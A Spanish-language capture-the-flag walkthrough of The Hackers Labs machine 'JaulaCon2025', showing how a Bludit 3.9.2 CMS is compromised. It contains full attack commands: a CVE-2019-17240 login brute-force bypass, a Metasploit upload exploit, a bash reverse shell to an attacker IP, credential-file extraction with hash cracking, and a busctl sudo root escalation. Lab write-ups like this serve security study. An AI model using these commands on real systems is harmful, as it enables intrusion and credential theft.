# JaulaCon2025

<img width="1346" height="630" alt="image" src="https://github.com/user-attachments/assets/8a14c4ec-503f-481e-a399-1759ecec1253" />
 
**Plataforma:** The Hackers Labs  
**Dificultad:** Principiante  
**OS:** Linux  
**Fecha:** 03/08/2026
 
## 0. Resumen
 
Máquina Linux de nivel principiante montada sobre **Bludit CMS 3.9.2**, vulnerable a un bypass del mecanismo de mitigación de fuerza bruta (CVE-2019-17240) y a una carga de imágenes maliciosa que termina en ejecución de código
 
El camino de explotación combina:
- Enumeración de directorios y confirmación de la versión de Bludit
- Bypass de la protección anti-fuerza bruta del login (CVE-2019-17240) para obtener credenciales válidas
- Explotación de la subida de imágenes de Bludit para conseguir ejecución remota de comandos
- Extracción y descifrado de credenciales almacenadas en la base de datos plana de usuarios
- Escalada a root abusando de `busctl` con permisos sudo (GTFOBins)
  
## 1. Reconocimiento

   Ping
 
```bash
ping -c 2 <IP>
```

<img width="1232" height="143" alt="image" src="https://github.com/user-attachments/assets/3ac00a1f-047f-4736-8db5-0dfe2ee90689" />

→ TTL=64 sugiere que se trata de un host Linux
 
   Nmap
 
```bash
sudo nmap -p- --open -sCV -Pn -n --min-rate 5000 <IP> -oA jaulacon2025
```
 
| Orden | Función |
|---|---|
| `-p-` | Escanea todos los puertos (65535) |
| `--open` | Muestra únicamente puertos abiertos |
| `-sCV` | Ejecución de scripts básicos y detección de versión de servicios |
| `-Pn` | Omite descubrimiento de host |
| `-n` | Sin resolución de DNS, para agilizar el escaneo |
| `--min-rate` | Acelera el escaneo forzando el envío de 5000 paquetes/segundo |
| `-oA` | Output en todos los formatos (.nmap, .xml, .gnmap) |
 
**Resultados:**
 
- Puerto 22: OpenSSH 9.2p1 (Debian 12)
  
- Puerto 80: Apache 2.4.62 (Debian), título de la página "Bienvenido a Bludit"
  
El propio banner HTTP (`http-generator: Bludit`) confirma el CMS sin necesidad de fingerprinting adicional, lo que orienta directamente la búsqueda de vulnerabilidades hacia Bludit en lugar de un análisis genérico de la web
 
## 2. Enumeración web

<img width="1195" height="583" alt="image" src="https://github.com/user-attachments/assets/7d098804-f636-4e33-a5a6-7478ef74fc45" />
 
### 2.1 Resolución de DNS y fuzzing de directorios
 
```bash
echo "<IP> jaulacon2025.thl" | sudo tee -a /etc/hosts
 
gobuster dir -u http://jaulacon2025.thl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```
 
**Resultados:**
 
- `/admin` (301) → panel de login de Bludit
  
- `/install.php`, `/robots.txt`, `/LICENSE`

`/admin` es el objetivo evidente, ya que cualquier CMS con panel de administración accesible convierte la autenticación en la primera puerta a forzar
 
### 2.2 Confirmación de versión y usuario expuesto
 
Al acceder a `/admin` se confirma la versión **Bludit 3.9.2**, y en el contenido público de la web aparece el nombre `Jaulacon2025`, que se toma como candidato a nombre de usuario válido
 
## 3. Explotación - Bypass de fuerza bruta (CVE-2019-17240)
 
Bludit ≤ 3.9.2 tiene una vulnerabilidad conocida (CVE-2019-17240): el mecanismo que bloquea IPs tras varios intentos fallidos de login confía en la cabecera `X-Forwarded-For`, que el cliente controla libremente. Rotando ese valor en cada intento, el bloqueo nunca llega a activarse
 
Existe un exploit público que automatiza esto. En mi caso, lo busqué mediante `searchsploit`

```bash
searchsploit bludit 3.9.2
```

<img width="1417" height="173" alt="image" src="https://github.com/user-attachments/assets/20c14f2b-9267-4632-b7ce-89062d9e07ac" />

Entre los resultados aparece tanto la versión en Ruby (autor Alexandre Zanni) como una versión en Python del mismo exploit; utilicé esta última, que gestiona el token CSRF y la rotación de `X-Forwarded-For` directamente:

```bash
searchsploit -m php/webapps/48746.py
```

El script:
1. Obtiene el `tokenCSRF` vigente antes de cada intento (Bludit lo revalida por sesión)
2. Envía el POST a `/admin/login` con usuario fijo y contraseña del diccionario
3. Rota la cabecera `X-Forwarded-For` en cada petición para evitar el contador de intentos fallidos
4. Se detiene al no recibir el mensaje de error de credenciales incorrectas

Al intentar lanzarlo directamente, nos da el siguiente error:

```bash
Traceback (most recent call last):
  File "/home/kali/Desktop/VMS/TheHackersLab/JaulaCon2025/files/48942.py", line 28, in <module>
    from pwn import *
ModuleNotFoundError: No module named 'pwn'
```

El script depende de la librería pwntools, que no viene instalada por defecto en Kali. Se soluciona instalándola
 
```bash
pip3 install pwntools
```

→ Nos lanza el error `externally-managed-environment`, por lo que empleamos la flag `--break-system-packages`

```bash
pip3 install pwntools --break-system-packages
```

Por otro lado, el script espera un archivo de usuarios, no un usuario suelto por parámetro. Como no estaba claro si el nombre de usuario real usaba mayúscula inicial (visto en la web como "Jaulacon2025") o iba todo en minúscula, se incluyeron ambas variantes para no descartar ninguna

```bash
echo -e "JaulaCon2025\njaulacon2025" > users.txt
```

Y volvemos a probar el script

```bash
python3 48942.py -l http://10.0.2.10/admin/login -u users.txt -p /usr/share/wordlists/rockyou.txt
 ```

| Orden | Función |
|---|---|
| `-l` | URL del panel de login |
| `-u` | Diccionario con usuarios indicados |
| `-p` | 	Diccionario con contraseñas comunes |

El script:
1. Obtiene el `tokenCSRF` vigente antes de cada intento (Bludit lo revalida por sesión)
2. Envía el POST a `/admin/login` con usuario fijo y contraseña del diccionario
3. Rota la cabecera `X-Forwarded-For` en cada petición para evitar el contador de intentos fallidos
4. Se detiene al no recibir el mensaje de error de credenciales incorrectas

<img width="980" height="137" alt="image" src="https://github.com/user-attachments/assets/4425fb25-99ff-45c8-be17-70652e455764" />
   
→ Credenciales válidas: `Jaulacon2025 : cassandra`
 
También existe la versión en Ruby del mismo exploit, aunque en su caso hace falta forzar la lectura del diccionario en `ISO-8859-1` (en vez de UTF-8 por defecto) para evitar errores con caracteres no válidos en `rockyou.txt`

## 4. Explotación - Ejecución remota vía subida de imágenes
 
Bludit tiene una vulnerabilidad conocida en su gestor de subida de imágenes que permite cargar un archivo con extensión ejecutable disfrazado de imagen. Metasploit ya tiene un módulo que automatiza todo el proceso (subida + ejecución + shell):
 
```bash
msfconsole

msf > search bludit

msf > use exploit/linux/http/bludit_upload_images_exec

msf exploit > show options

msf exploit > set RHOSTS <IP>

msf exploit > set BLUDITUSER Jaulacon2025

msf exploit > set BLUDITPASS cassandra

msf exploit > set LHOST <IP_ATACANTE>

msf exploit > set LPORT 4444

msf exploit > run
```

<img width="1253" height="174" alt="image" src="https://github.com/user-attachments/assets/9ae9077c-1321-40ec-bfb7-bf52a8d795fc" />

→ Sesión de Meterpreter como `www-data`
 
### 4.1 Estabilización de la sesión - reverse shell

En lugar de trabajar directamente sobre la sesión de Meterpreter, se lanza una reverse shell de bash hacia nuestra máquina mediante un listener:
 
```bash
nc -lvnp 443

bash -c 'bash -i >& /dev/tcp/10.0.2.15/443 0>&1'
```
 
→ Se obtiene una shell de bash completa y estable como www-data, más cómoda de manejar que la sesión de Meterpreter para los siguientes pasos de enumeración

## 5. Post-explotación
 
### 5.1 Extracción de credenciales
 
Bludit almacena usuarios en un archivo JSON, no en una base de datos:
 
```bash
cat /var/www/html/bl-content/databases/users.php
```

<img width="1110" height="424" alt="image" src="https://github.com/user-attachments/assets/e0e78824-90ea-4be7-bfad-a121225f841c" />
 
→ El archivo contiene el hash del usuario `JaulaCon2025 : 551211bcd6ef18e32742a73fcb85430b`
 
### 5.2 Cracking del hash
 
```text
Hash: 551211bcd6ef18e32742a73fcb85430b
```
 
Por su longitud (32 caracteres hexadecimales) se identifica como MD5. Se resuelve con un servicio como CrackStation, obteniendo la contraseña real del sistema: `Brutales` (distinta de la contraseña del panel web, lo que confirma que no hay reutilización directa entre ambas capas)

<img width="1021" height="323" alt="image" src="https://github.com/user-attachments/assets/0114c497-d7e3-4154-bfa7-85fae34beb50" />

También podría resolverse mediante hashcat, empleando un diccionario de contraseñas más completo, como `kaonashi` (repo: https://github.com/kaonashi-passwords/Kaonashi), ya que si lo intentamos con  `rockyou.txt` no lo podremos romper:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/kaonashi/kaonashi.txt
```
 
### 5.3 Acceso SSH
 
```bash
ssh JaulaCon2025@<IP>
```
 
## 6. Escalada de privilegios
 
### 6.1 Enumeración de privilegios
 
```bash
sudo -l
```

<img width="1079" height="41" alt="image" src="https://github.com/user-attachments/assets/846bd217-f1d4-432d-a982-96ca3165fde5" />

→ El usuario puede ejecutar `/usr/bin/busctl` como root sin contraseña
 
### 6.2 Explotación de `busctl` (GTFOBins)

<img width="840" height="169" alt="image" src="https://github.com/user-attachments/assets/5153b392-b5b9-4d90-8598-7c8309414cb6" />

`busctl` permite interactuar con D-Bus, y una de sus opciones (`--address`) admite ejecutar un binario arbitrario como transporte, lo que se puede aprovechar para lanzar una shell:
 
```bash
sudo -u root /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
 
| Fragmento | Función |
|---|---|
| `set-property ... LogLevel s debug` | Llamada D-Bus cualquiera, solo se usa como excusa para forzar la conexión |
| `--address=unixexec:path=/bin/sh,...` | Fuerza a `busctl` a "conectarse" ejecutando `/bin/sh` en lugar de hablar con el bus real, heredando los privilegios de root con los que corre `busctl` por sudo |
 
→ Shell interactiva como root
 
## 6.2 Primera flag (Jaulacon2025)

```bash
cat /home/JaulaCon2025/user.txt
```

## 6.3 Segunda flag (root)

```bash
cat /root/root.txt
``` 

## 8. Lecciones aprendidas

<img width="1048" height="532" alt="image" src="https://github.com/user-attachments/assets/1e4cb380-3b28-444a-9bb4-ad44e750af08" />
 
- Confiar en cabeceras controladas por el cliente (`X-Forwarded-For`) para implementar límites de intentos de login es una mitigación trivialmente evadible
  
- Un CMS desactualizado (Bludit 3.9.2) puede tener módulos de explotación ya empaquetados en Metasploit; comprobar la versión exacta del software es siempre el primer paso antes de buscar exploits
  
- Guardar usuarios en archivos planos accesibles desde el propio servidor web, con salts poco serios, reduce drásticamente el esfuerzo de un atacante que ya tiene ejecución de comandos
  
- `sudo -l` + GTFOBins vuelve a ser el patrón de cierre: cualquier binario permitido por sudo debe evaluarse como posible vector de escalada, no solo por lo que "se supone" que hace
